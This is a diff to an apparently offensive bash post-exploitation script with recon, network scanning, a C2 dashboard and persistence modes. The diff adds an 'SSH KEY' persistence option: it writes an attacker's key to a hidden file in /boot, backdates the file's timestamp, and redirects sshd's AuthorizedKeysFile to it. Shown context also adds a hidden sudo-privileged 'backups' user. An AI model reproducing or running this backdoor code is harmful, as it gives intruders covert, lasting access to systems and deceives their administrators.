@@ -34,7 +34,7 @@ function help() {
      $Rd["$We"+"$Rd"]$Gn -ds$We        -   DEEP SEARCH ("$Yw"Show Tools, Crontab Files, SUID Binaries, Writable Folders"$We")
      $Rd["$We"+"$Rd"]$Gn -n$We         -   NETWORK ("$Yw"Show Network Information and use Ping Sweep and Port Scan modes"$We")
      $Rd["$We"+"$Rd"]$Gn -c2$We        -   CHACAL C2 ("$Yw"Manage SSH Connections Through a Dashboard"$We")
-     $Rd["$We"+"$Rd"]$Gn -p$We         -   PERSISTENCE ("$Yw"Create a Privileged User Called BACKUPS and Create a Backdoor in Python3"$We")
+     $Rd["$We"+"$Rd"]$Gn -p$We         -   PERSISTENCE ("$Yw"Create a Privileged User Called BACKUPS, Create a Backdoor in Python3 and an SSH KEY"$We")
   "
 }
 
@@ -67,41 +67,41 @@ fi
 #    [MACHINE INFORMATIONS]
 # ---------------------------
 function machineinfo() {
-   clear
-   echo -e "$Gn [+] About me: $We"
-   id | cut -d ' ' -f1 | cut -d '=' -f2 
-   echo
+    clear
+    echo -e "$Gn [+] About me: $We"
+    id | cut -d ' ' -f1 | cut -d '=' -f2 
+    echo
 
-   echo -e "$Gn [+] Path: $We"
-   echo $PATH
-   echo 
+    echo -e "$Gn [+] Path: $We"
+    echo $PATH
+    echo 
 
-   echo -e "$Gn [+] HardwareInfo: $We"
-   grep 'model name' /proc/cpuinfo | head -1 | awk -F': ' '{print $2}'
-   echo 
+    echo -e "$Gn [+] HardwareInfo: $We"
+    grep 'model name' /proc/cpuinfo | head -1 | awk -F': ' '{print $2}'
+    echo 
 
-   echo -e "$Gn [+] SystemInfo: $We"
-   hostnamectl
-   echo 
+    echo -e "$Gn [+] SystemInfo: $We"
+    hostnamectl
+    echo 
 
-   echo -e "$Gn [+] Partitions: $We"
-   df -h || lsblk
-   echo
+    echo -e "$Gn [+] Partitions: $We"
+    df -h || lsblk
+    echo
 
-   echo -e "$Gn [+] Sudo: $We"
-   sudo -V| head -n1
-   echo 
+    echo -e "$Gn [+] Sudo: $We"
+    sudo -V| head -n1
+    echo 
 
-   echo -e "$Gn [+] Super Users: $We"
-   awk -F: '($3 == "0") {print}' /etc/passwd
-   echo 
+    echo -e "$Gn [+] Super Users: $We"
+    awk -F: '($3 == "0") {print}' /etc/passwd
+    echo 
 
-   echo -e "$Gn [+] Shell Users: $We"
-   cat /etc/passwd | grep "sh$"
-   echo 
+    echo -e "$Gn [+] Shell Users: $We"
+    cat /etc/passwd | grep "sh$"
+    echo 
 
-   echo -e "$Gn [+] Date: $We"
-   date
+    echo -e "$Gn [+] Date: $We"
+    date
 }
 
 # ---------------------------
@@ -149,17 +149,17 @@ function deepsearch() {
 }
 
 tools() {
-   clear
-   echo -e "
-   $Gn [+] Tools: $We"
-   which sudo doas service systemctl systemd xterm chattr tmux screen pkexec ssh sshd netstat ss socat ping curl wget nc ncat netcat nmap tcpdump telnet make clang gcc g++ go perl php python python2 python2.7 python3 python3.6 python3.7 ruby aws docker lxc lxd rkt podman kubectl
+    clear
+    echo -e "
+    $Gn [+] Tools: $We"
+    which sudo doas service systemctl systemd xterm chattr tmux screen pkexec ssh sshd netstat ss socat ping curl wget nc ncat netcat nmap tcpdump telnet make clang gcc g++ go perl php python python2 python2.7 python3 python3.6 python3.7 ruby aws docker lxc lxd rkt podman kubectl
 }
 
 crontab() {
-   clear
-   echo -e "
-   $Gn [+] Crontab: $We"
-   cat /etc/crontab && ls -als /etc/cron*
+    clear
+    echo -e "
+    $Gn [+] Crontab: $We"
+    cat /etc/crontab && ls -als /etc/cron*
 }
 
 suid() {
@@ -399,6 +399,7 @@ function persistence() {
     1. Return
     2. Backdoor
     3. Backup User
+    4. SSH KEY
     "
     read -p "[Option]> " options
 
@@ -416,6 +417,12 @@ function persistence() {
         backup_user
         clear
         echo -e "["$Gn"Backup User Created!"$We"]"
+        ;;
+      4)
+        ssh_key
+        clear
+        cat /boot/model-generic
+        echo -e "["$Gn"SSH KEY Created in /boot/model-generic"$We"]"
         ;;
       *)
         echo
@@ -518,6 +525,19 @@ backup_user() {
         echo -ne "\n$name   ALL=(ALL:ALL) ALL\n" >> /etc/sudoers
         rm -rf /home/backups
         sed -i 's/:\/home\/backups:/:\/var\/backups:/g' /etc/passwd
+}
+
+ssh_key() {
+        echo
+        read -p "$(echo -e "${Rd}Paste your public key:${We} ")" -r key
+        echo $key >> /boot/model-generic
+        chmod 600 /boot/model-generic
+        touch -t 201910280000 /boot/model-generic
+        sed -i 's/^.AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config
+        sed -i 's/AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config
+        sed -i 's/^.PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
+        sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
+        service ssh restart || systemctl restart sshd
 }
 
 # ---------------------------
